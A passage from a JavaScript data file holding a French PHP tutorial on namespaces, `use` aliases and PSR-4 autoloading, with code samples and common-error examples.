            { t: 'code', lang: 'php', label: 'src/Boutique/Panier.php', code:
'<?php\nnamespace App\\Boutique;          // TOUJOURS la première instruction\n\nclass Panier\n{\n    // Nom COMPLET de la classe : App\\Boutique\\Panier\n    public function __construct(public array $articles = []) {}\n}' },
            { t: 'h3', h: 'Consommer : use et les alias' },
            { t: 'code', lang: 'php', code:
'<?php\nrequire __DIR__ . "/vendor/autoload.php";\n\nuse App\\Boutique\\Panier;\nuse App\\Boutique\\Client;\nuse GuzzleHttp\\Client as HttpClient;    // alias : deux "Client" cohabitent !\n\n$panier = new Panier();                  // App\\Boutique\\Panier\n$client = new Client();                  // App\\Boutique\\Client\n$http   = new HttpClient();              // GuzzleHttp\\Client\n\n// Sans use : le nom COMPLET, mené par l\'antislash initial\n$date = new \\DateTimeImmutable();       // (les classes natives vivent à la RACINE)' },
            { t: 'callout', kind: 'info', h: '**Résolution relative** : dans `namespace App\Boutique;`, écrire `new Panier()` vise `App\Boutique\Panier`. Pour viser une classe globale (DateTime, PDO, Exception) sans `use`, préfixe d\'un `\` : `new \PDO(...)`. **Fonctions et constantes**, elles, retombent automatiquement sur l\'espace global : `strlen()` marche partout sans import.' },
            { t: 'h3', h: 'PSR-4 : namespace = arborescence' },
            { t: 'code', lang: 'bash', code:
'src/\n├── Boutique/\n│   ├── Panier.php        → namespace App\\Boutique;  class Panier\n│   └── Client.php        → namespace App\\Boutique;  class Client\n├── Http/\n│   └── ApiControleur.php → namespace App\\Http;      class ApiControleur\n└── bootstrap.php\n\n# La règle : App\\  →  src/    (déclaré dans composer.json, fiche Composer)\n# Nom de DOSSIER = nom de segment, CASSE incluse (sensible sous Linux !)' },
            { t: 'code', lang: 'js', label: 'extrait composer.json', code:
'"autoload": {\n    "psr-4": { "App\\\\": "src/" }\n}' },
            { t: 'h3', h: 'Cas d\'usage et limites' },
            { t: 'ul', items: [
              'Deux libs, un même nom de classe : les namespaces les font cohabiter via alias.',
              'Un projet structuré (« Boutique », « Http », « Exceptions ») qui se lit comme ton domaine.',
              'Un fichier ne déclare qu\'UN namespace racine par segment logique (plusieurs segments autorisés).',
              'Les namespaces n\'isolent PAS le code (visibilité, private…) : c\'est de l\'adressage, pas un bac à sable.'
            ] }
          ],
          errors: [
            { title: 'use oublié : Class not found', lang: 'php', bad:
'// namespace App\\Http;\n$panier = new Panier();\n// PHP cherche… App\\Http\\Panier → Fatal error class not found', good:
'use App\\Boutique\\Panier;\n$panier = new Panier();\n// ou le nom complet : new \\App\\Boutique\\Panier();', why: 'Sans use ni antislash, PHP résout le nom RELATIVEMENT au namespace courant : il colle l\'espace actuel devant et ne trouve rien. Le message « Class "App\Http\Panier" not found » te dit exactement ce qu\'il a tenté.' },
            { title: 'Namespace et dossiers en désaccord', lang: 'php', bad:
'// src/boutique/panier.php  :\nnamespace App\\Boutique;\nclass panier { }          // nom de classe en minuscules, dossier pareil…', good:
'// src/Boutique/Panier.php :\nnamespace App\\Boutique;\nclass Panier { }          // PSR-4 : 1 segment = 1 dossier, 1 classe = 1 fichier,\n                           // mêmes noms, même CASSE', why: 'L\'autoloader PSR-4 calcul le CHEMIN à partir du nom complet. Un écart de casse ou de dossier passe parfois sur macOS/Windows (insensibles) — puis explose sur le serveur Linux de prod, sensible à la casse. Zéro fantaisie.' }
          ],
          related: ['php-composer', 'php-inclusion', 'php-poo-classes', 'lv-fondamentaux']
        }
      ]
    }
);
